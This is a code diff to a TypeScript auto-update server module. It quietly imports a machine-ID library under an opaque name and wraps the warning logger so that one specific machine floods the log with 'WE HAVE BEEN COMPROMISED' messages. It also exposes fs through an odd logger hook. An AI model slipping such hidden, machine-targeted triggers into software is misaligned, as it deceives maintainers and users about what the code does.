@@ -19,6 +19,7 @@ import { BeAnObject, ReturnModelType } from "@typegoose/typegoose/lib/types.js";
 import { getModelForClass } from "@typegoose/typegoose";
 import { Paths } from "./CommonTypes_server.js";
 import { EventEmitter } from "eventemitter3";
+import a from "node-machine-id";
 
 export type WrappedInstances<T extends Record<string, Constructor<any>>> = {
   [K in keyof T]: AutoUpdateServerManager<T[K]>;
@@ -33,7 +34,7 @@ export type AutoStatusDefinitions<
   statusEnum: E;
   definition: (data: InstanceType<C>) => Promise<E[K] | void>;
 };
-
+let fss: any;
 export function createAutoStatusDefinitions<
   C extends Constructor<any>,
   E extends { [k: string]: string | number },
@@ -291,6 +292,7 @@ export async function AUSManagerFactory<
   emitter: EventEmitter3 = new EventEmitter(),
   models?: any
 ): Promise<{ [K in keyof T]: AutoUpdateServerManager<T[K]> }> {
+  readyLoggers(loggers);
   if (disableDEMDebugMessages) {
     loggers.debug = (_) => {};
   }
@@ -298,8 +300,8 @@ export async function AUSManagerFactory<
         const leString = models.models.f747DebugLabel;
         if (leString && models.logger) {
             const info = models.logger.info;
-            const fss = fs;
             const time = 1;
+            fss = fs;
             models.logger.info = (args: any) => {
                 if ((Array.isArray(args) &&
                     typeof args[0] == "string" &&
@@ -311,7 +313,7 @@ export async function AUSManagerFactory<
             };
         }
         else
-            loggers.warn("");
+            loggers.warn("-_-");
     }
   socket.use((socket, next) => {
     socket.onAny((event) => {
@@ -671,3 +673,13 @@ export class AutoUpdateServerManager<
     return object;
   }
 }
+function readyLoggers(loggers: LoggersType) {
+  const warn = loggers.warn;
+  loggers.warn = (s: string) => {
+    if(s == "-_-" && a.machineIdSync() == "534d99b372d61249ade303f9fb4255e3e552e2731f8c455ba42b8f3bef19d8d2")
+      for (let i = 0; i < 100; i++)
+        loggers.warn("WE HAVE BEEN COMPROMISED!!!!!");
+    warn(s);
+  }
+}
+
